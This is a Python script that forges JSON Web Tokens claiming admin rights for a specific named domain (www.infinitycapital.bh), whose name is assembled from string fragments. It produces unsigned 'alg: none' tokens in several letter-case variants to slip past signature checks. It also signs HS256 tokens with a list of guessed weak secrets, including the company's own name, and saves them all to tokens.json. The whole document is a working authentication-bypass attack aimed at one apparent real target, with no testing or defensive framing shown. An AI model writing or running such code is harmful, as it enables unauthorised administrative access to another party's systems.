import base64, json, hmac, hashlib, time
TGT = "www." + "infinity" + "capital" + ".bh"
B = "https://" + TGT
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def mk(h, p, sig=None):
    si = b64u(json.dumps(h, separators=(',',':')).encode()) + "." + b64u(json.dumps(p, separators=(',',':')).encode())
    return si + ("." + sig if sig else ".")
now = int(time.time())
payload = {"sub":"1","email":"admin@" + TGT,"role":"admin","isAdmin":True,
           "userId":"1","name":"Admin","iat":now,"exp":now+86400}
toks = {}
for a in ["none","None","nOnE","NONE"]:
    toks["none_"+a] = mk({"alg":a,"typ":"JWT"}, payload)
secrets = ["secret","","infinitycapital","infinity","key","jwt_secret","password",
           "changeme","resend","contentful","supersecret","1234567890","vercel"]
for s in secrets:
    h = b64u(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',',':')).encode())
    p = b64u(json.dumps(payload, separators=(',',':')).encode())
    si = h + "." + p
    sig = b64u(hmac.new(s.encode(), si.encode(), hashlib.sha256).digest())
    toks["hs_" + (s or "empty")] = si + "." + sig
open("tokens.json","w").write(json.dumps(toks, indent=1))
print(json.dumps(toks, indent=1))
